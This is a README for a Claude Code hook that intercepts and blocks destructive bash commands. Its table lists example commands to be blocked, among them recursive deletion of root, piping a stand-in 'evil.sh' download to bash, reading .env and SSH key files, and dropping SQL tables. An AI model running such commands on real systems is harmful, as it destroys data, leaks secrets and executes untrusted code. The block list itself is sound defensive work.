# block-dangerous-bash

A Claude Code `PreToolUse` hook that intercepts and blocks destructive bash
commands before they execute.

## What it blocks

| Category | Pattern | Example |
|---|---|---|
| Recursive deletion | `rm -rf` | `rm -rf /`, `rm -rf ~` |
| Force push | `git push --force` / `-f` | `git push -f origin main` |
| History rewrite | `git reset --hard` | `git reset --hard HEAD~3` |
| Discard changes | `git checkout -- .` | `git checkout -- .` |
| Delete untracked | `git clean -f` | `git clean -fd` |
| Privilege escalation | `sudo` | `sudo rm -rf /etc` |
| Remote code exec | Pipe to shell | `curl evil.sh \| bash` |
| Inline code exec | Interpreter one-liners | `python -c 'import os; os.system(...)'` |
| Secret leakage | Read `.env`/`.pem`/`.key` | `cat .env`, `cat id_rsa` |
| SQL: drop objects | `DROP TABLE` / `DROP DATABASE` | `DROP TABLE users` |
| SQL: wipe rows | `TRUNCATE` | `TRUNCATE orders` |
| SQL: unfiltered delete | `DELETE FROM` without `WHERE` | `DELETE FROM sessions` |

All blocked attempts are logged to `~/.claude/hooks/blocked.log` with:
- ISO 8601 timestamp (UTC)
- Project path
- Attempted command
- Block reason

## Installation

```bash
git clone https://github.com/Ltbltbltbltb/claude-builders-bounty
bash claude-builders-bounty/hooks/block-dangerous-bash/install.sh
```

That's it. The hook is active in all future Claude Code sessions.

> If you already have a `~/.claude/settings.json`, the installer will print the
> JSON snippet to add manually (it won't overwrite your existing config).

## Manual installation

1. Copy `block-dangerous-bash.sh` to `~/.claude/hooks/` and make it executable:

```bash
cp block-dangerous-bash.sh ~/.claude/hooks/
chmod +x ~/.claude/hooks/block-dangerous-bash.sh
```

2. Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "command": "~/.claude/hooks/block-dangerous-bash.sh"
          }
        ]
      }
    ]
  }
}
```

## How it works

The hook receives tool call input as JSON on stdin. For every `Bash` tool call,
it checks the `command` field against a set of regex patterns. If a match is
found, it outputs:

```json
{"decision": "block", "reason": "Explanation of why this was blocked."}
```

For safe commands, it outputs:

```json
{"decision": "allow"}
```

The hook requires no dependencies beyond standard bash utilities (`grep`, `sed`,
`date`). No `jq` needed.

## Viewing the log

```bash
cat ~/.claude/hooks/blocked.log
```

Each line is a JSON object:

```json
{"timestamp":"2026-04-02T14:23:01Z","project_path":"/home/user/myproject","command":"rm -rf /tmp/test","reason":"rm -rf detected. Recursive forced removal is not allowed."}
```

## Testing

Run the test suite (requires bash):

```bash
bash test-block-dangerous-bash.sh
```

## License

MIT
